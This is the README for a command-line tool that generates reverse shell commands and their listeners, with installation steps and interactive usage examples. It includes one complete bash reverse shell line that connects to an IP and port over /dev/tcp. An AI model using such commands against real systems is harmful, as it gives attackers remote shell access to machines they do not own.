# General Information

https://pypi.org/project/revshell-generator/

The Reverse Shell Generator is a CLI tool that assists in quickly generating reverse shell commands and their corresponding listener commands.

# Installation

You can either clone the repository or install the package from PyPI.

Clone the repository:

```bash
apt install python3 python3-pip
git clone https://github.com/totekuh/reverse-shell-generator
cd reverse-shell-generator
pip3 install .
python3 revshellgenerator.py -h
```

PyPI:
```bash
sudo apt install python3 python3-pip
sudo pip3 install revshell-generator
revshell-generator -h
```

# Usage

You can use the Reverse Shell Generator either interactively or by passing parameters directly on the command line.



### Running the Reverse Shell Generator

```bash
$ revshell-generator
Welcome to the reverse shell generator. Type 'help' or '?' to list available commands.
```

### Setting Reverse IP Address and Port

```bash
revshell-generator --ip 192.168.1.10 --port 8080 --shell /bin/bash
```

You can also specify the IP address by providing a network interface name:

```bash
revshell-generator --ip eth0 --port 8080 --shell /bin/bash
```

In interactive mode, you can set these parameters using the ip, port, and shell commands:

```bash
>> ip 192.168.1.10
>> port 8080
>> shell /bin/bash
```

### Listing Available Reverse Shell Commands

```bash
>> list reverse
```

*Note: the indexes are used while choosing the command template.*

### Listing Available Listener Commands

```bash
>> list listeners
```

### Generating Reverse Shell Commands

```bash
$ python3 revshellgenerator.py
>> get reverse 0
```

The above command will generate the first available reverse shell command, replacing the placeholders with the provided IP, port, and shell. Here's an example of how it might look:

```bash
bash -i >& /dev/tcp/192.168.1.10/8080 0>&1
```

### Generating Listener Commands

```bash
>> get listeners 10
```

For more detailed instructions and specific commands, use the 'help' command followed by the command name, such as `help list` or `help get`.
